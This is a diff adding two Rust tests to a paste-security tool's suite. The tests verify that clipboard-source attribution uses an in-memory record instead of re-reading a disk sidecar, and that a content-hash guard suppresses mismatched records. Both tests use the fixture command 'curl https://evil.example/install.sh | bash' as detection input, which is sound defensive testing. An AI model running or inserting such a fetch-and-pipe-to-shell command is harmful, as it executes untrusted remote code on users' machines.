@@ -2611,3 +2611,260 @@ fn paste_source_absent_or_invalid_does_not_reread_sidecar() {
             .collect::<Vec<_>>(),
     );
 }
+
+// ---------------------------------------------------------------------------
+// M12 ch1 — the `Loaded(rec)` arm of the `ClipboardSourceState` tri-state is the
+// whole reason the enum exists over a `bool`/`Option`: per its doc it GUARANTEES
+// the engine uses the caller's IN-MEMORY record and does NOT re-read disk, so the
+// `paste_source_mismatch` finding and the CLI-displayed attribution agree
+// byte-for-byte even if the sidecar file changes between the CLI's read and the
+// engine's (the G1 TOCTOU). Both engine branches that consult the tri-state — the
+// tier-1 force-past gate and the tier-3 dispatch — short-circuit `Loaded(rec)` to
+// the in-memory copy, never touching `state_dir()/clipboard_source.json`.
+//
+// SUBTLETY (verified against `rules/paste_provenance::check_with_record`): the
+// rule's FIRST step bails (`return Vec::new()`) when `record.matches_bytes(raw)`
+// is false — a content-hash MISMATCH means "this paste did not come from the
+// recorded source", so NO attribution and NO finding. The finding only fires when
+// the hash MATCHES (attribution proceeds) AND a destination host differs from the
+// record's `source_url` host (a HOST mismatch). So "the in-memory record says
+// mismatch" must be expressed as matching-hash + different-host, NOT a
+// non-matching hash (which would suppress the finding entirely).
+//
+// This test plants a sidecar on disk that, if re-read, says "legit source, no
+// mismatch" (matching hash + SAME host as the paste destination → no finding),
+// then hands the engine a DIFFERENT in-memory `Loaded` record (matching hash +
+// DIFFERENT host → host mismatch). The finding firing proves the engine used the
+// in-memory record, not the matching-and-benign disk record. A regression that
+// re-read disk in the `Loaded` arm would see "no mismatch" and this test fails.
+// Shares `CONTEXT_TEST_LOCK` because it mutates `XDG_STATE_HOME`.
+// ---------------------------------------------------------------------------
+#[test]
+fn paste_source_loaded_uses_in_memory_record_not_disk() {
+    use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
+    use tirith_core::verdict::RuleId;
+
+    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+
+    // A paste that pipes to a shell (corroborating signal → HIGH) with a single
+    // destination host, `evil.example`.
+    let paste = "curl https://evil.example/install.sh | bash";
+    // SHA-256 of `paste`, verified with `printf '%s' '<paste>' | shasum -a 256`.
+    let content_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
+
+    // Plant an on-disk record that a stray re-read would treat as the LEGIT
+    // source: its hash matches the paste AND its host equals the paste's
+    // destination host (`evil.example`) → attribution succeeds with NO host
+    // mismatch → NO finding. So if the engine wrongly re-read disk in the
+    // `Loaded` arm, `PasteSourceMismatch` would NOT fire.
+    let dir = tempfile::tempdir().unwrap();
+    let state_dir = dir.path().join("state");
+    let tirith_state = state_dir.join("tirith");
+    fs::create_dir_all(&tirith_state).unwrap();
+    let disk_record_json = format!(
+        r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://evil.example/page","source_title":"Benign","hidden_text_detected":false}}"#
+    );
+    fs::write(tirith_state.join("clipboard_source.json"), disk_record_json).unwrap();
+
+    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
+    unsafe {
+        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
+    }
+
+    // The IN-MEMORY record handed to the engine: SAME (matching) content hash, so
+    // attribution proceeds, but a DIFFERENT source host (`docs.trusted.example`)
+    // than the paste's destination (`evil.example`) → host mismatch → finding.
+    let in_memory = ClipboardSourceRecord {
+        updated_at: "2026-05-30T00:00:00Z".to_string(),
+        content_sha256: content_sha256.to_string(),
+        source_url: "https://docs.trusted.example/install".to_string(),
+        source_title: "Install Guide".to_string(),
+        hidden_text_detected: false,
+    };
+
+    let analyze_paste = |state: ClipboardSourceState| {
+        let ctx = AnalysisContext {
+            input: paste.to_string(),
+            shell: ShellType::Posix,
+            scan_context: ScanContext::Paste,
+            raw_bytes: Some(paste.as_bytes().to_vec()),
+            interactive: false,
+            cwd: None,
+            file_path: None,
+            repo_root: None,
+            is_config_override: false,
+            clipboard_html: None,
+            card_ref: None,
+            clipboard_source: state,
+        };
+        engine::analyze(&ctx)
+    };
+
+    let loaded = analyze_paste(ClipboardSourceState::Loaded(in_memory));
+    // Positive control: with NO tri-state record, the engine reads the on-disk
+    // record (matching hash + SAME host) → no host mismatch → NO finding. Proves
+    // the disk record genuinely says "legit", so the `Loaded` assertion below is
+    // observing the in-memory record, not a coincidentally-firing disk read.
+    let unread = analyze_paste(ClipboardSourceState::Unread);
+
+    unsafe {
+        match prev_xdg {
+            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
+            None => std::env::remove_var("XDG_STATE_HOME"),
+        }
+    }
+
+    // SECURITY-CRITICAL: the engine used the in-memory `Loaded` record (different
+    // host → mismatch) and did NOT silently re-read the matching-and-benign disk
+    // record. A regression that re-read disk in the `Loaded` arm fails here.
+    assert!(
+        loaded
+            .findings
+            .iter()
+            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+        "Loaded(rec) must drive attribution from the IN-MEMORY record (host mismatch \
+         → PasteSourceMismatch), not re-read the benign on-disk record; got: {:?}",
+        loaded
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>(),
+    );
+
+    // Control: the on-disk record (matching hash + SAME host) produces NO mismatch
+    // when read via `Unread` — confirming the disk side really says "legit", so the
+    // `Loaded` finding above is the in-memory record talking, not the disk.
+    assert!(
+        !unread
+            .findings
+            .iter()
+            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+        "the planted on-disk record (matching hash + same host) must NOT fire \
+         PasteSourceMismatch via Unread; got: {:?}",
+        unread
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>(),
+    );
+}
+
+// ---------------------------------------------------------------------------
+// M12 ch1 — companion to the test above: prove the `Loaded(rec)` decision needs
+// ZERO disk presence. With NO `clipboard_source.json` on disk at all (so a stray
+// `read_source_record()` would return `None`), two `Loaded` records with the SAME
+// paste produce OPPOSITE verdicts purely from their in-memory contents:
+//   * matching content hash + DIFFERENT host → host mismatch → PasteSourceMismatch;
+//   * NON-matching content hash → the rule's step-1 hash guard bails → NO finding.
+// Together this shows (a) the in-memory record alone drives the verdict (no disk
+// dependency — the `Loaded` arm never stats or reads disk) and (b) the content-hash
+// guard suppresses attribution for a record whose hash does not match the paste.
+// Shares `CONTEXT_TEST_LOCK` because it mutates `XDG_STATE_HOME`.
+// ---------------------------------------------------------------------------
+#[test]
+fn paste_source_loaded_hash_guard_drives_verdict_with_no_sidecar() {
+    use tirith_core::clipboard::{ClipboardSourceRecord, ClipboardSourceState};
+    use tirith_core::verdict::RuleId;
+
+    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+
+    let paste = "curl https://evil.example/install.sh | bash";
+    // SHA-256 of `paste` (matches the paste); the non-matching record below uses
+    // an all-zero hash that is deliberately NOT this value.
+    let matching_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
+    let non_matching_sha256 = "0000000000000000000000000000000000000000000000000000000000000000";
+
+    // Point `state_dir()` at an EMPTY temp dir: NO `clipboard_source.json` exists,
+    // so any re-read would yield `None`. The verdict must come solely from the
+    // in-memory `Loaded` record.
+    let dir = tempfile::tempdir().unwrap();
+    let state_dir = dir.path().join("state");
+    fs::create_dir_all(state_dir.join("tirith")).unwrap();
+    assert!(
+        !state_dir.join("tirith/clipboard_source.json").exists(),
+        "precondition: no sidecar on disk"
+    );
+
+    let prev_xdg = std::env::var_os("XDG_STATE_HOME");
+    unsafe {
+        std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
+    }
+
+    let analyze_paste = |state: ClipboardSourceState| {
+        let ctx = AnalysisContext {
+            input: paste.to_string(),
+            shell: ShellType::Posix,
+            scan_context: ScanContext::Paste,
+            raw_bytes: Some(paste.as_bytes().to_vec()),
+            interactive: false,
+            cwd: None,
+            file_path: None,
+            repo_root: None,
+            is_config_override: false,
+            clipboard_html: None,
+            card_ref: None,
+            clipboard_source: state,
+        };
+        engine::analyze(&ctx)
+    };
+
+    // (1) Matching hash + DIFFERENT host → attribution proceeds, host mismatch.
+    let matching_diff_host = ClipboardSourceRecord {
+        updated_at: "2026-05-30T00:00:00Z".to_string(),
+        content_sha256: matching_sha256.to_string(),
+        source_url: "https://docs.trusted.example/install".to_string(),
+        source_title: String::new(),
+        hidden_text_detected: false,
+    };
+    let fires = analyze_paste(ClipboardSourceState::Loaded(matching_diff_host));
+
+    // (2) NON-matching hash → rule's step-1 guard bails, NO attribution.
+    let non_matching = ClipboardSourceRecord {
+        updated_at: "2026-05-30T00:00:00Z".to_string(),
+        content_sha256: non_matching_sha256.to_string(),
+        source_url: "https://docs.trusted.example/install".to_string(),
+        source_title: String::new(),
+        hidden_text_detected: false,
+    };
+    let suppressed = analyze_paste(ClipboardSourceState::Loaded(non_matching));
+
+    unsafe {
+        match prev_xdg {
+            Some(v) => std::env::set_var("XDG_STATE_HOME", v),
+            None => std::env::remove_var("XDG_STATE_HOME"),
+        }
+    }
+
+    // With zero disk presence, the matching-hash + different-host in-memory record
+    // alone fires the mismatch.
+    assert!(
+        fires
+            .findings
+            .iter()
+            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+        "a Loaded record (matching hash + different host) must fire PasteSourceMismatch \
+         from memory alone, with no sidecar on disk; got: {:?}",
+        fires
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>(),
+    );
+
+    // And a Loaded record whose hash does NOT match the paste is suppressed by the
+    // rule's content-hash guard — no attribution, no finding — again with no disk
+    // dependency.
+    assert!(
+        !suppressed
+            .findings
+            .iter()
+            .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
+        "a Loaded record whose content hash does NOT match the paste must be suppressed \
+         (no attribution); got: {:?}",
+        suppressed
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>(),
+    );
+}
